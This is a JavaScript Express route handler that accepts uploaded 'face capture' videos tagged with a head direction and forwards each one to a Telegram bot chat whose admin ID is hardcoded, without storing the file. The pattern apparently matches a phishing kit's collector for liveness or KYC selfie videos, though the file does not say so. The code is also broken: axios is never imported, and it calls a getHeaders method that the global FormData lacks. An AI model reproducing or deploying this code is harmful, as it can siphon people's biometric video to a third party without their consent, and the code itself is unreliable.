import express from 'express';
import formidable from 'formidable';
import path from 'path';
import fs from 'fs';
import dotenv from 'dotenv';

dotenv.config();

const router = express.Router();

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = "7213907462";
const sendVideoToTelegram = async (videoStream, direction) => {
    const telegramBotToken =  TELEGRAM_BOT_TOKEN
    const chatId = ADMIN_CHAT_ID

    try {
        // Create the form data for sending video
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('video', videoStream, 'capture.webm');
        formData.append('caption', `Face capture direction: ${direction}`);

        // Send the video to Telegram using axios
        const response = await axios.post(
            `https://api.telegram.org/bot${telegramBotToken}/sendVideo`,
            formData,
            {
                headers: {
                    ...formData.getHeaders(),
                },
            }
        );

        console.log('Video sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending video to Telegram:', error);
    }
};

// Define the route to handle video upload without storing it
router.post('/upload', (req, res) => {
    const form = new formidable.IncomingForm();
    form.keepExtensions = true;

    // Set the upload directory to temporary memory (won't actually store the video on disk)
    form.parse(req, (err, fields, files) => {
        if (err) {
            console.error('Error during file upload:', err);
            return res.status(500).send('Error during file upload');
        }

        const direction = fields.direction || 'unknown'; // Get the direction from form data
        const videoFile = files.video; // Assuming the video file is sent as 'video'

        // Check if the video file exists
        if (!videoFile) {
            return res.status(400).send('No video file uploaded');
        }

        const videoStream = fs.createReadStream(videoFile[0].filepath); // Create a stream of the video file

        // Send the video directly to Telegram
        sendVideoToTelegram(videoStream, direction)
            .then(() => {
                res.status(200).send('Video uploaded and sent to Telegram!');
            })
            .catch((error) => {
                console.error('Error processing video upload:', error);
                res.status(500).send('Error processing video');
            });
    });
});
export default router;
